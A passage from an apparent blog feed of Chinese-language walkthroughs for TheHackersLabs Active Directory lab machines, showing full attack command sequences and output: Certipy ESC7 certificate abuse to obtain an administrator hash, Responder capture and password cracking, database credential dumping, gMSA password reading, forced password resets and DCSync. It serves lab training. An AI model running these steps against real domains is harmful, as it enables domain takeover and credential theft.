WIN-9FQTT7GPAVK.mentality.thl  \n```\n\n发现 `ESC 7`\n\n```bash\n➜  Mentallity cat 20250723221243_Certipy.txt \nCertificate Authorities\n  0\n    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA\n    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl\n    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl\n    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646\n    Certificate Validity Start          : 2025-07-17 13:46:02+00:00\n    Certificate Validity End            : 2045-07-17 13:56:02+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : MENTALITY.THL\\Administrators\n      Access Rights\n        Enroll                          : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n        ManageCa                        : MENTALITY.THL\\svcapp1\n                                          MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n        ManageCertificates              : MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n    [+] User Enrollable Principals      : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n    [+] User ACL Principals             : MENTALITY.THL\\svcapp1\n    [!] Vulnerabilities\n      ESC7                              : User has dangerous permissions.\nCertificate Templates                   : [!] Could not find any certificate templates\n```\n\n跟着文档打即可\n\n文档链接：https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca\n\n```bash\n➜  Mentallity certipy-ad ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer 'svcapp1'\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully added officer 'svcapp1' on 'mentality-WIN-9FQTT7GPAVK-CA'\n```\n\n```bash\n➜  Mentallity certipy ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template 'SubCA'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled 'SubCA' on 'mentality-WIN-9FQTT7GPAVK-CA'\n```\n\n```bash\n➜  Mentallity certipy req \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template 'SubCA' \\\n    -upn 'administrator@mentality.thl' -sid 'S-1-5-21-1896710242-59548724-504912181-500'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 5\n[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.\nWould you like to save the private key? (y/N): y\n[*] Saving private key to '5.key'\n[*] Wrote private key to '5.key'\n[-] Failed to request certificate\n```\n\n```bash\n➜  Mentallity certipy ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request '5'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate request ID 5\n```\n\n```bash\n➜  Mentallity certipy req \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -retrieve '5'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Retrieving certificate with ID 5\n[*] Successfully retrieved certificate\n[*] Got certificate with UPN 'administrator@mentality.thl'\n[*] Certificate object SID is 'S-1-5-21-1896710242-59548724-504912181-500'\n[*] Loaded private key from '5.key'\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\n获取 `HASH`\n\n```bash\n➜  Mentallity certipy-ad auth -pfx 'administrator.pfx' -domain \"mentality.thl\" -dc-ip 192.168.56.28\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@mentality.thl'\n[*]     SAN URL SID: 'S-1-5-21-1896710242-59548724-504912181-500'\n[*]     Security Extension SID: 'S-1-5-21-1896710242-59548724-504912181-500'\n[*] Using principal: 'administrator@mentality.thl'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@mentality.thl': aad3b435b51404xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd04a6bd959f95ce2b2\n```\n\n读取 `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root_flag.txt\n4042xxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n不难，但是差一点点就首杀了！！！！！！！！！！！！！！！！\n\n就五分钟！！",
            "url": "https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity",
            "title": "TheHackersLabs - Mentallity",
            "summary": "Mentallity https://labs.thehackerslabs.com/machine/120 Recon PortScan namp 端口扫描 貌似是双网卡 枚举测试 SMB 匿名账户测试 FTP 匿名测试 HTTP HTTP 80 HTTP 8080 发现一个登录页面 我们点击登录...",
            "date_modified": "2025-07-23T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "AD",
                "ESC7",
                "FTP"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2",
            "content_html": "\n# Curiosity2\n\n> https://labs.thehackerslabs.com/machine/103\n> \n\n![image.png](/post-images/TheHackersLabsCuriosity2/image.png)\n\n## Recon\n\n### PortScan\n\n`nmap` 端口扫描\n\n```bash\n➜  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST\nWarning: 192.168.56.116 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.116\nHost is up (0.00030s latency).\nNot shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49684/tcp open  unknown\n49685/tcp open  unknown\n49689/tcp open  unknown\n49693/tcp open  unknown\n49704/tcp open  unknown\n57936/tcp open  unknown\n60031/tcp open  unknown\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\n➜  Curiosity2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.116\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST\nNmap scan report for 192.168.56.116\nHost is up (0.00086s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 11:41:37Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49685/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Instance name: SQLEXPRESS\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|     TCP port: 57936\n|_    Clustered: false\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n| ms-sql-ntlm-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Target_Name: CONS\n|     NetBIOS_Domain_Name: CONS\n|     NetBIOS_Computer_Name: WIN-C73PROQLRHL\n|     DNS_Domain_Name: cons.thl\n|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl\n|_    Product_Version: 10.0.14393\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n60031/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-19T11:42:32\n|_  start_date: 2025-07-19T18:29:12\n|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.86 ms 192.168.56.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.59 seconds\n```\n\n### 枚举测试\n\n测试 `SMB` 匿名账户\n\n```bash\n➜  Curiosity2 nxc smb cons.thl -u anonymous -p ''                                                             \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\\anonymous: STATUS_LOGON_FAILURE \n```\n\n再看一眼 `wireshark` ，依旧有 `LLMNR`包，并且从数据包可以看出来是在查询 `SQLserver`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image1.png)\n\n### Responder\n\n我们开启 `Responder` 不一会就就能抓到 `HASH`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image2.png)\n\n开局的思路和`Curiosity`差不多\n\n我们尝试将`HASH`进行爆破\n\n```bash\nhashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt\n```\n\n得到密码`au7umn@`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image3.png)\n\n测试凭据\n\n```bash\n➜  Curiosity2 nxc smb cons.thl -u sqldb -p 'au7umn@'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc ldap cons.thl -u sqldb -p 'au7umn@'\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc winrm cons.thl -u sqldb -p 'au7umn@'\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ (Pwn3d!)\n```\n\n## 脱库\n\n根据用户名，该用户应该是对数据库有一定权限\n\n```bash\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT @@VERSION\"\n\n------------------------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT name FROM sys.databases\"\nname\n--------------------------------------------------------------------------------------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nCredentialsDB\ntoolsdb\n\n(6 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;SELECT name FROM sys.tables\"\nChanged database context to 'CredentialsDB'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;SELECT * FROM Credentials\"\nChanged database context to 'CredentialsDB'.\nID          Username                                           Password\n----------- -------------------------------------------------- -------------------------------------------------------------\n          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;SELECT name FROM sys.tables\"\nMsg 916, Level 14, State 2, Server WIN-C73PROQLRHL\\SQLEXPRESS, Line 1\nThe server principal \"CONS\\sqldb\" is not able to access the database \"toolsdb\" under the current security context.\n```\n\n拿到 `sqlsvc` 的密码`MD5`值，拿去破解，还可以发现\n\n得到密码 `$PRING2021#`\n\n```bash\n➜  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\n$PRING2021#      (?)     \n1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s $pr1ng..$umm3r2021%\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```\n\n测试`sqlsvc`的凭据\n\n```bash\n➜  Curiosity2 nxc winrm cons.thl -u sqlsvc -p '$PRING2021#'\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021# (Pwn3d!)\n➜  Curiosity2 nxc ldap cons.thl -u sqlsvc -p '$PRING2021#'\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021# \n➜  Curiosity2 nxc smb cons.thl -u sqlsvc -p '$PRING2021#'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021#\n```\n\n## KeePass - 1\n\n使用`WinRM`登陆上去后，目录中有一个`Database.kdbx`\n\n是`KeePass`的文件\n\n```bash\n*Evil-WinRM* PS C:\\Users\\sqlsvc\\Documents> ls\n\n    Directory: C:\\Users\\sqlsvc\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/31/2024   6:23 PM           2231 Database.kdbx\n```\n\n我们尝试一下使用`KeePass` 来打开，需要密码\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image4.png)\n\n没有密码，先放着\n\n## 横向移动\n\n### 域分析\n\n上 `BloodHound`\n\n用户很多，所以这里直接筛选了远程管理组（REMOTE MANAGMENT US）的用户\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image5.png)\n\n能发现 `SQLSVC` 能直接修改 `GMSA_SQL`的密码\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image6.png)\n\n然后 `GMSA_SQL` 还可以修改 `TOOLSDB` （上边有一个同名数据库，我们无权限访问）的密码\n\n总结起来就是\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image7.png)\n\n### To Toolsdb\n\n首先读取 `gMSA`的密码\n\n```bash\n➜  gMSADumper python gMSADumper.py -u sqlsvc -p '$PRING2021#' -d cons.thl  \nUsers or groups who can read password for GMSA_SQL$:\n > Svc_Accounts\nGMSA_SQL$:::0960ee1575670e65d189eb6e685713ca\nGMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0\nGMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212\n```\n\n再通过 `GMSA_SQL` 修改 `TOOLSDB` 的密码\n\n```bash\n➜  Curiosity2 bloodyAD -d 'cons.thl' -u 'GMSA_SQL$' -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 set password 'TOOLSDB' 'Password@123'\n[+] Password changed successfully!\n```\n\n测试凭据\n\n```bash\n➜  Curiosity2 nxc smb cons.thl -u TOOLSDB -p 'Password@123'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\TOOLSDB:Password@123 \n```\n\n### To Msol & KeePass - 2\n\n我们登陆上`toolsdb` ，并用数据库脱 `toolsdb` 的数据\n\n```bash\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;select name from sys.tables\"\nChanged database context to 'toolsdb'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nusers\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;select * from users\"\nChanged database context to 'toolsdb'.\nid          username                                           password\n----------- -------------------------------------------------- --------------------------------------------------\n          1 user_6B482050                                      433129A1!@1\n          2 user_47F7501A                                      64409A1C!@1\n          3 user_515A0C58                                      CAD616E3!@1\n          4 user_CA843BF2                                      731C60AD!@1\n          5 user_AA2B9FF8                                      8E181E5F!@1\n          6 user_F6E6A108                                      47862562!@1\n          7 user_8D56BAE8                                      425B6335!@1\n          8 user_BA9B1295                                      E4FC1AC4!@1\n          9 user_66B7DBEE                                      4EE216A3!@1\n         10 user_E75B7C23                                      4CD89A92!@1\n\n(10 rows affected)\n```\n\n给了一组密码，感觉是 `KeePass` 文件的密码\n\n```bash\n433129A1!@1\n64409A1C!@1\nCAD616E3!@1\n731C60AD!@1\n8E181E5F!@1\n47862562!@1\n425B6335!@1\nE4FC1AC4!@1\n4EE216A3!@1\n4CD89A92!@1\n```\n\n最后使用`8E181E5F!@1`成功解密\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image8.png)\n\n得到用户 `MSOL` 用户密码 `YRax2Ry8g2ITQ3hpRPze`\n\n测试凭据\n\n```bash\n➜  Curiosity2 nxc smb cons.thl -u MSOL -p 'YRax2Ry8g2ITQ3hpRPze'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\MSOL:YRax2Ry8g2ITQ3hpRPze \n```\n\n### To Administrator\n\n查看权限，oiiaioiiiai\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image9.png)\n\n我们对域有`GetChangeAll`\n\n直接`Dump`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image10.png)\n\n读取 `user.txt` 和 `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\appolonia\\Documents> cat User.flag.txt\nde4xxxxxxxxxxxxxxxxxxxx\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root.flag.txt\n372xxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n没有卡点，酣畅淋漓，一把梭哈\n\n现在就`Curiosity3`把我卡住了",
            "url": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2",
            "title": "TheHackersLabs - Curiosity2",
            "summary": "Curiosity2 https://labs.thehackerslabs.com/machine/103 Recon PortScan nmap 端口扫描 枚举测试 测试 SMB 匿名账户 再看一眼 wireshark ，依旧有 LLMNR包，并且从数据包可以看出来是在查询 SQLserver ...",
            "date_modified": "2025-07-19T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "AD",
                "Responder",
                "MSSQL",
                "gMSA",
                "KeePass"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity",
            "content_html": "\n# Curiosity\n\n> https://labs.thehackerslabs.com/machine/23\n> \n\n![image.png](/post-images/TheHackersLabsCuriosity/image.png)\n\n## Recon\n\n### PortScan\n\n`nmap` 端口扫描\n\n```bash\n➜  Curiosity nmap -sT -min-rate 10000 -p- 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:28 CST\nWarning: 192.168.56.8 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.8\nHost is up (0.00052s latency).\nNot shown: 64857 closed tcp ports (conn-refused), 653 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49672/tcp open  unknown\n49683/tcp open  unknown\n49695/tcp open  unknown\n49703/tcp open  unknown\n49704/tcp open  unknown\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n`UDP` 也扫描\n\n```bash\n➜  Curiosity nmap -sU -min-rate 10000 -p- 192.168.56.8                                                                                                                                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:35 CST\nWarning: 192.168.56.8 giving up on port because retransmission cap hit (10).\nNmap scan report for hackme.thl (192.168.56.8)\nHost is up (0.032s latency).\nNot shown: 65449 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)\nPORT    STATE SERVICE\n53/udp  open  domain\n88/udp  open  kerberos-sec\n123/udp open  ntp\n137/udp open  netbios-ns\n389/udp open  ldap\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\n➜  Curiosity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:29 CST\nNmap scan report for 192.168.56.8\nHost is up (0.00050s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 05:30:19Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n3269/tcp  open  ssl/ldap      